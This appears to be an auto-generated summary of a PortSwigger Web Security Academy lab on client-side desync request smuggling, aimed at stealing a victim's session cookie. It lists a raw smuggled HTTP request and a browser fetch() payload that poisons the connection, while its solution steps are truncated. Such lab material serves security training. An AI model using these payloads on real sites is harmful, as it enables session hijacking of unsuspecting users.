## Client-side desync

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab is vulnerable to client-side desync attacks because the server ignores theContent-Lengthheader on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.

### Solution Steps
This lab is a client-side variation of a technique we covered in a
previous request smuggling lab
.

### Key Payloads
- `Content-Length`
- `GET /`
- `POST`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.h1-web-security-academy.net
Connection: close
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x`
- `Connection`
- `keep-alive`
- `fetch()`
- `fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
        mode: 'no-cors',
        credentials: 'include'
    })
})`
- `catch()`
- `GET /en/post?postId=x`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: request_smuggling

---
*Source: PortSwigger Web Security Academy*
